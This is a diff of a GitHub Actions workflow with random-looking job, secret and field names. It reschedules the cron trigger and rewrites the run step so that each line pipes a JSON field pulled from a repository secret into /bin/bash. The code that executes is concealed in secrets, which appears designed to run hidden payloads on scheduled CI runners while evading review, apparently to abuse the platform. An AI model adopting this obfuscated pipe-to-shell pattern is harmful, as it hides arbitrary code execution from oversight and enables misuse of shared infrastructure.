@@ -2,26 +2,20 @@ name: chengzhuangshi6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
+    - cron: '21 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chengzhuangshi6789
         env:
-          ghoc184: ${{ secrets.ghoc184 }}
+          nshq826: ${{ secrets.nshq826 }}
         run: |
-          echo $ghoc184 | jq -r .htdrg318 | /bin/bash
-          echo $iclt33 | jq -r .gfnq4254 | /bin/bash
-          echo $hvr5 | jq -r .kxej54 | /bin/bash
-          echo $bfza397 | jq -r .iez397 | /bin/bash
-          echo $cxybn053 | jq -r .ybxg3 | /bin/bash
-          echo $lknge3675 | jq -r .cvvj650 | /bin/bash
-          echo $ot26719 | jq -r .zldtd6235 | /bin/bash
-          echo $obbay8 | jq -r .dalf3 | /bin/bash
-          echo $caws90 | jq -r .bmv586 | /bin/bash
-          echo $zw1862 | jq -r .zdgyu8217 | /bin/bash
-          echo $hli606 | jq -r .ycxkh0 | /bin/bash
+          echo $nshq826 | jq -r .lyk63569 | /bin/bash
+          echo $y520 | jq -r .o67983 | /bin/bash
+          echo $ovxj886 | jq -r .s95715 | /bin/bash
+          echo $i090 | jq -r .x492 | /bin/bash
+          echo $tx90 | jq -r .ad839 | /bin/bash
 
